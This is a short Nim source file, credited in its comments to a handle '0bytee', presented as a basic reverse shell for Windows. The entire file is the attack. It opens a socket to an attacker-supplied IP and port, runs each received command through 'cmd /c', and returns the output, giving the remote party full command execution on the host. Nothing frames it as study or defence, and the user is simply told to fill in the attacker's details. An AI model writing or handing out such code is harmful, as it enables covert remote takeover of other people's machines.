# Code by 0bytee
# Github: github.com/0bytee
# IG: 0byteee
# This is a basic reverse shell in Nim lang 

import os, net, strutils

# Function to run a command and capture the output
proc execCmd(cmd: string): string =
    let output = execProcess("cmd /c " & cmd, options = {poUsePath, poStdErrToStdOut})
    return output

# Function to establish reverse connection to the attacker
proc reverseShell(attacker_ip: string, attacker_port: int) =
    let sock = newSocket()
    sock.connect(attacker_ip, Port(attacker_port))

    while true:
        # Receive command from the attacker
        var buffer = newString(1024)
        let recvLen = sock.recv(buffer)
        if recvLen == 0:
            break

        # Execute the received command
        let cmdOutput = execCmd(buffer[0 .. recvLen-1])

        # Send the output back to the attacker
        sock.send(cmdOutput & "\n")

    sock.close()

# Replace "attacker_ip" and "attacker_port" with your attacker machine details
reverseShell("attacker_ip", attacker_port)
